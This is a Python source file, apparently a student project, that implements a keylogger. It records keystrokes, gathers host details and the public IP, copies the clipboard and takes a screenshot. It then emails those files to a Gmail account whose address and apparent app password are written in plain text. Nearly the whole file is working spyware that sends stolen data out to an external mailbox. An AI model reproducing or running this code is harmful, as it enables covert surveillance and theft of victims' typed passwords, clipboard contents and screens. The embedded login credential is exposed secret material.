from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
import smtplib
import socket
import platform
import win32clipboard
from pynput.keyboard import Key, Listener
import time
from scipy.io.wavfile import write
import sounddevice as sd
from requests import get
from PIL import ImageGrab

keys_info = "keys_information.txt"
sys_info = "system_information.txt"
clipboard_info = "clipboard.txt"
microphone_time = 1
audio_information = "audio.wav"
screenshot_info = "screenshot.png"
email_address = "keyloggerprojectt@gmail.com"
password = "zwbmmwxxgxqhjmpe"
toaddr = "keyloggerprojectt@gmail.com"
file_path = "C:\\Users\\lenovo\\PycharmProjects\\finalproject\\Project"
extend = "\\"

count = 0
keys = []


def on_press(key):
    global keys, count

    print(key)
    keys.append(key)
    count += 1

    if count >= 1:
        count = 0
        write_file(keys)
        keys = []


def write_file(keys):
    with open(file_path + extend + keys_info, "a") as f:
        for key in keys:
            k = str(key).replace("'", "")
            if k.find("space") > 0:
                f.write('\n')
                f.close()
            elif k.find("Key") == -1:
                f.write(k)
                f.close()


# adding time function

start_time = time.time()


def on_release(key):
    current_time = time.time()
    timer = 15
    if current_time - start_time > timer:
        return False


with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()


# sending email function

def send_email(filename, attachment, toaddr):
    fromaddr = email_address
    msg = MIMEMultipart()
    msg['From'] = fromaddr
    msg['To'] = toaddr
    msg['Subject'] = "Keylogger"
    body = "Body_of_the_mail"
    msg.attach(MIMEText(body, 'plain'))
    filename = filename
    attachment = open(attachment, 'rb')
    p = MIMEBase('application', 'octet-stream')
    p.set_payload((attachment).read())
    encoders.encode_base64(p)
    p.add_header('Content-Disposition', "attachment; filename = %s" % filename)
    msg.attach(p)
    s = smtplib.SMTP('smtp.gmail.com', 587)
    s.starttls()
    s.login(fromaddr, password)
    text = msg.as_string()
    s.sendmail(fromaddr, toaddr, text)
    s.quit()


# Getting computer information

def computer_information():
    with open(file_path + extend + sys_info, "a") as f:
        hostname = socket.gethostname()
        IPAddr = socket.gethostbyname(hostname)
        try:
            public_ip = get("https://api.ipify.org").text
            f.write("Public IP Address: " + public_ip + "\n")

        except Exception:
            f.write("Couldn't get Public Ip Address" + "\n")

        f.write("Processor: " + (platform.processor()) + '\n')
        f.write("System: " + platform.system() + " " + platform.version() + '\n')
        f.write("Machine: " + platform.machine() + "\n")
        f.write("Hostname: " + hostname + "\n")
        f.write("Private IP Address: " + IPAddr + "\n")


computer_information()


# Getting clipboard information
def copy_clipboard():
    with open(file_path + extend + clipboard_info, "a") as f:
        try:
            win32clipboard.OpenClipboard()
            pasted_data = win32clipboard.GetClipboardData()
            win32clipboard.CloseClipboard()

            f.write("Clipboard Data: \n" + pasted_data)

        except:
            f.write("Clipboard couldn't be not be copied")


copy_clipboard()


# Microphone function but isn't working properly
def microphone():
    fs = 44100
    seconds = microphone_time

    myrecording = sd.rec(int(seconds * fs), samplerate=fs, channels=2)
    sd.wait()
    write(file_path + extend + audio_information, fs, myrecording)


# Getting screenshot

def screenshot():
    im = ImageGrab.grab()
    im.save(file_path + extend + screenshot_info)


screenshot()

send_email(keys_info, file_path + extend + keys_info, toaddr)
send_email(screenshot_info, file_path + extend + screenshot_info, toaddr)
send_email(sys_info, file_path + extend + sys_info, toaddr)
send_email(clipboard_info, file_path + extend + clipboard_info, toaddr)
